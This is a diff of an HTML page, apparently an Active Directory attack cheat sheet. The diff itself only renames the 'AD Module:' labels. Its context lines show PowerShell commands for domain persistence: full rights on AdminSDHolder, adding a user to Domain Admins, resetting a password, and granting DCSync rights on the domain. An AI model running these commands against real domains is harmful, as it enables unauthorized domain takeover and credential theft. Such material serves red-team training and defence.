@@ -601,7 +601,7 @@ mimikatz# !-
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetADSprefix <span class="s1">'CN=AdminSDHolder,CN=System'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'CN=AdminSDHolder,CN=System,DC=corp,DC=local'</span> -Principal user1 -Verbose 
 </code></pre></div>    </div>
   </li>
@@ -632,7 +632,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ObjectACL -SamAccountName <span class="s2">"Domain Admins"</span> -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">Get-Acl</span> -Path <span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local'</span><span class="o">)</span>.Access | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
 </code></pre></div>    </div>
   </li>
@@ -651,7 +651,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainGroupMember -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-ADGroupMember</span> -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
 </code></pre></div>    </div>
   </li>
@@ -664,7 +664,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainUserPassword -Identity user2 -AccountPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADACcountPassword</span> -Identity user2 -NewPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
 </code></pre></div>    </div>
   </li>
@@ -681,7 +681,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -Verbose
 </code></pre></div>    </div>
   </li>
@@ -696,7 +696,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights DCSync -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -GUIDRight DCSync -Verbose
 </code></pre></div>    </div>
   </li>
